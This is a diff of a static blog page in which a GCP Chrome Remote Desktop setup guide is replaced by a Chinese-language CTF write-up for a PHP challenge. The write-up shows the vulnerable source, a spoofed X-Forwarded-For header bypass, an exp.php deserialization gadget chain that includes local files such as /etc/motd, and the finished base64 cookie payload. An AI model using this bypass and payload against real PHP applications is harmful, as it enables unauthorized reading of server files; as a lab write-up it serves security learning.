@@ -16,28 +16,29 @@
   <meta name="author" content="Giwawa">
   <meta name="keywords" content="">
   
-    <meta name="description" content="GCP 安裝 Chrome-Remote-Desktop">
+    <meta name="description" content="WEB-InfoSecCTF2022-Message of the day">
 <meta property="og:type" content="article">
-<meta property="og:title" content="GCP安裝Chrome-Remote-Desktop">
-<meta property="og:url" content="https://0xbe61a55f.github.io/2022/12/03/Chrome-Remote-Desktop/index.html">
+<meta property="og:title" content="WEB-InfoSecCTF2022-Message of the day">
+<meta property="og:url" content="https://0xbe61a55f.github.io/2022/12/04/WEB-InfoSecCTF2022-Message%20of%20the%20day/index.html">
 <meta property="og:site_name" content="Giwawa&#39;s Blog">
-<meta property="og:description" content="GCP 安裝 Chrome-Remote-Desktop">
+<meta property="og:description" content="WEB-InfoSecCTF2022-Message of the day">
 <meta property="og:locale" content="zh_TW">
-<meta property="og:image" content="https://i.imgur.com/F8KFXfj.png">
-<meta property="og:image" content="https://i.imgur.com/9UEbfJm.png">
-<meta property="og:image" content="https://i.imgur.com/iMVL2xA.png">
-<meta property="article:published_time" content="2022-12-02T19:07:33.000Z">
-<meta property="article:modified_time" content="2022-12-02T19:08:50.546Z">
+<meta property="og:image" content="https://i.imgur.com/ghSzYSu.png">
+<meta property="og:image" content="https://i.imgur.com/SeA8DWB.png">
+<meta property="article:published_time" content="2022-12-04T15:36:24.000Z">
+<meta property="article:modified_time" content="2022-12-04T15:39:31.723Z">
 <meta property="article:author" content="Giwawa">
-<meta property="article:tag" content="VPS">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="反序列化">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://i.imgur.com/F8KFXfj.png">
+<meta name="twitter:image" content="https://i.imgur.com/ghSzYSu.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>GCP安裝Chrome-Remote-Desktop - Giwawa&#39;s Blog</title>
+  <title>WEB-InfoSecCTF2022-Message of the day - Giwawa&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -214,7 +215,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="GCP安裝Chrome-Remote-Desktop"></span>
+            <span id="subtitle" data-typed-text="WEB-InfoSecCTF2022-Message of the day"></span>
           
         </div>
 
@@ -225,8 +226,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-12-03 03:07" pubdate>
-          星期六, 十二月 3日 2022, 3:07 凌晨
+        <time datetime="2022-12-04 23:36" pubdate>
+          星期日, 十二月 4日 2022, 11:36 晚上
         </time>
       </span>
     
@@ -238,7 +239,7 @@
         <i class="iconfont icon-chart"></i>
         
           <!-- compatible with older versions-->
-          492 字
+          2.6k 字
         
       </span>
     
@@ -250,7 +251,7 @@
         
         
           <!-- compatible with older versions-->
-          5 分鐘
+          23 分鐘
         
       </span>
     
@@ -296,35 +297,34 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">GCP安裝Chrome-Remote-Desktop</h1>
+            <h1 style="display: none">WEB-InfoSecCTF2022-Message of the day</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="GCP-安裝-Chrome-Remote-Desktop"><a href="#GCP-安裝-Chrome-Remote-Desktop" class="headerlink" title="GCP 安裝 Chrome-Remote-Desktop"></a>GCP 安裝 Chrome-Remote-Desktop</h1><h2 id="環境"><a href="#環境" class="headerlink" title="環境"></a>環境</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">GCP N1<br>Ubuntu 22.04 LTS x86_64 <br></code></pre></td></tr></table></figure>
-<h2 id="VPS安裝Chrome遠端桌面"><a href="#VPS安裝Chrome遠端桌面" class="headerlink" title="VPS安裝Chrome遠端桌面"></a>VPS安裝Chrome遠端桌面</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs !">wget https://dl.google.com/linux/direct/chrome-remote-desktop_current_amd64.deb<br><br>sudo apt-get install --assume-yes ./chrome-remote-desktop_current_amd64.deb<br></code></pre></td></tr></table></figure>
-<h2 id="安裝桌面環境"><a href="#安裝桌面環境" class="headerlink" title="安裝桌面環境"></a>安裝桌面環境</h2><ul>
-<li><p>更新存儲庫</p>
-<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">sudo apt <span class="hljs-keyword">update</span> <span class="hljs-variable">&amp;&amp;</span> sudo apt upgrade<br></code></pre></td></tr></table></figure>
+                <h1 id="Message-of-the-Day"><a href="#Message-of-the-Day" class="headerlink" title="Message of the Day"></a>Message of the Day</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">題目首頁顯示 You are not allowed to access.<br>先用dirsearch爆破目錄<br></code></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/ghSzYSu.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">發現backup.zip<br>裡面有三個檔案 client.php read.php index.php<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>index.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs !">&lt;?php<br><br>	include(&#x27;client.php&#x27;);<br><br>	function getIP()<br>	&#123;<br>	    if (!empty($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]))<br>	    &#123;<br>	      $ip=$_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];<br>	    &#125;<br>	    else<br>	    &#123;<br>	      $ip=$_SERVER[&#x27;REMOTE_ADDR&#x27;];<br>	    &#125;<br>	    return $ip;<br>	&#125;<br><br>	if (getIP() == &#x27;127.0.0.1&#x27;) &#123;<br>		if (!isset($_COOKIE[&#x27;client&#x27;])) &#123;<br>			setcookie(&quot;client&quot;, base64_encode(serialize(new Client(&#x27;Guest&#x27;))));<br>		&#125; else &#123;<br>			unserialize(base64_decode($_COOKIE[&#x27;client&#x27;]));<br>		&#125;<br>	&#125;<br>	else &#123;<br>		header(&#x27;HTTP/1.0 403 Forbidden&#x27;);<br>    	die(&#x27;You are not allowed to access.&#x27;);<br>	&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
 </li>
-<li><p>安裝並設置顯示管理器。使用slim是因為它的輕量級特性</p>
-<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> slim<br></code></pre></td></tr></table></figure>
+<li><p>read.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs !">&lt;?php<br>	class Read &#123;<br>		<br>		// Still in development phase<br><br>		private $file_name;<br><br>		public function print($val) &#123;<br>			include($this-&gt;file_name);<br>			echo $val;<br>		&#125;<br>	&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
 </li>
-<li><p>安裝Ubuntu桌面環境</p>
-<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> ubuntu-desktop<br></code></pre></td></tr></table></figure>
-</li>
-<li><p>安裝完成後，重啟機器</p>
-<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo reboot</span><br></code></pre></td></tr></table></figure>
-</li>
-<li><p>重啟後會失去連接。再次通過 SSH 進入虛擬機啟動 slim</p>
-<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">sudo service slim <span class="hljs-literal">start</span><br></code></pre></td></tr></table></figure></li>
+<li><p>client.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs !">&lt;?php<br>	include(&#x27;read.php&#x27;);<br><br>	class Client &#123;<br><br>		private $name;<br>		private $tmp;<br><br>		function __construct($name) &#123;<br>			$this-&gt;name = $name;<br>			$this-&gt;tmp = new Message();<br>		&#125;<br><br>		function __destruct() &#123;<br>			$this-&gt;tmp-&gt;print($this-&gt;name);<br>		&#125;<br>	&#125;<br><br>	class Message &#123;<br><br>		public function print($val) &#123;<br>			echo &quot;Tigers and bears may be stronger predators, but wolves don&#x27;t perform in circus, &quot;. $val .&quot;!&quot;;<br>		&#125;<br><br>	&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure></li>
 </ul>
-<h2 id="配置Chrome-Remote-Desktop"><a href="#配置Chrome-Remote-Desktop" class="headerlink" title="配置Chrome-Remote-Desktop"></a>配置Chrome-Remote-Desktop</h2><ul>
-<li><p>設定其他電腦，並持續下一步<br><img src="https://i.imgur.com/F8KFXfj.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">拿到三個文件的<span class="hljs-built_in">source</span> code<br>首先會利用<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] 抓取使用者<br>使用者可控的header都不安全<br>可用X-Forwarded-For: 127.0.0.1 繞過<br><br>接著會對cookie裡面的內容做反序列化<br>unserialize(base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;client&#x27;</span>]));<br><br>會call Message的Print <span class="hljs-keyword">function</span><br>可改成<span class="hljs-built_in">read</span>的<span class="hljs-built_in">print</span> 並將file_name改成要include的檔案<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>exp.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs !">&lt;?php<br><br>class Read &#123;<br>		<br>    private $file_name = &#x27;/etc/motd&#x27;;<br><br>    public function print($val) &#123;<br>        include($this-&gt;file_name);<br>        echo $val;<br>    &#125;<br>&#125;<br><br>class Client &#123;<br><br>    private $name;<br>    private $tmp;<br><br>    function __construct($name) &#123;<br>        $this-&gt;name = $name;<br>        $this-&gt;tmp = new Read();<br>    &#125;<br><br>    function __destruct() &#123;<br>        $this-&gt;tmp-&gt;print($this-&gt;name);<br>    &#125;<br><br>&#125;<br><br>class Message &#123;<br><br>    public function print($val) &#123;<br>        echo &quot;Tigers and bears may be stronger predators, but wolves don&#x27;t perform in circus, &quot;. $val .&quot;!&quot;;<br>    &#125;<br><br>&#125;<br><br>$test = new Client(&#x27;/etc/passwd&#x27;);<br><br>$y = base64_encode(serialize($test));<br>echo $y;<br><br>?&gt;<br></code></pre></td></tr></table></figure>
 </li>
-<li><p>將最後一步指令複製到VPS主機上<br><img src="https://i.imgur.com/9UEbfJm.png" srcset="/img/loading.gif" lazyload></p>
-</li>
-<li><p>輸入六位數PIN，即可成功<br><img src="https://i.imgur.com/iMVL2xA.png" srcset="/img/loading.gif" lazyload></p>
+<li><p>requests get flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs !">根據題意 推測為motd指令 將payload file_name給/etc/motd<br>Cookie: client=Tzo2OiJDbGllbnQiOjI6e3M6MTI6IgBDbGllbnQAbmFtZSI7czoxMToiL2V0Yy9wYXNzd2QiO3M6MTE6IgBDbGllbnQAdG1wIjtPOjQ6IlJlYWQiOjE6e3M6MTU6IgBSZWFkAGZpbGVfbmFtZSI7czo5OiIvZXRjL21vdGQiO319<br><br>X-Forwarded-For: 127.0.0.1<br></code></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/SeA8DWB.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 </ul>
 
@@ -345,8 +345,15 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E7%AD%86%E8%A8%98/" class="category-chain-item">筆記</a>
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
   
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/WEB/" class="category-chain-item">WEB</a>
+  
+  
+
   
 
       </span>
@@ -360,7 +367,11 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/VPS/">#VPS</a>
+        <a href="/tags/CTF/">#CTF</a>
+      
+        <a href="/tags/PHP/">#PHP</a>
+      
+        <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">#反序列化</a>
       
     </div>
   
@@ -372,8 +383,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>GCP安裝Chrome-Remote-Desktop</div>
-      <div>https://0xbe61a55f.github.io/2022/12/03/Chrome-Remote-Desktop/</div>
+      <div>WEB-InfoSecCTF2022-Message of the day</div>
+      <div>https://0xbe61a55f.github.io/2022/12/04/WEB-InfoSecCTF2022-Message of the day/</div>
     </div>
     <div class="license-meta">
       
@@ -385,7 +396,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>發布於</div>
-          <div>2022年12月3日</div>
+          <div>2022年12月4日</div>
         </div>
       
       
@@ -417,18 +428,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/12/04/WEB-InfoSecCTF2022-Message%20of%20the%20day/" title="WEB-InfoSecCTF2022-Message of the day">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">WEB-InfoSecCTF2022-Message of the day</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/11/30/Pwn%E5%9F%BA%E7%A4%8E%E7%9F%A5%E8%AD%98/" title="Pwn基礎知識">
-                        <span class="hidden-mobile">Pwn基礎知識</span>
+                      <a href="/2022/12/03/Chrome-Remote-Desktop/" title="GCP安裝Chrome-Remote-Desktop">
+                        <span class="hidden-mobile">GCP安裝Chrome-Remote-Desktop</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
